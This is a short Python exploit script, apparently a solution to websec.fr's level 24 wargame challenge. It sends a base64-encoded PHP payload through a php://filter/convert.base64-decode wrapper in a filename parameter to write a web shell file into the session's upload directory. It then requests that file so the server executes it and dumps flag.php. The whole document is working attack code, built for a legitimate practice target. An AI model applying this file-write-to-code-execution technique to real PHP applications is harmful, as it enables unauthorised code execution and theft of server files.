import requests
from base64 import b64encode

URL = 'http://websec.fr/level24/'
payload = '<?php var_dump(file_get_contents("../../flag.php")); ?>'

s = requests.Session()
r = s.post(URL + 'index.php?p=edit&filename=php://filter/convert.base64-decode/resource=pwn.php', data={'data': b64encode(payload.encode())})
session_id = s.cookies.get_dict()['PHPSESSID']

r = s.get(URL + 'uploads/' + session_id + '/pwn.php')
print(r.text)
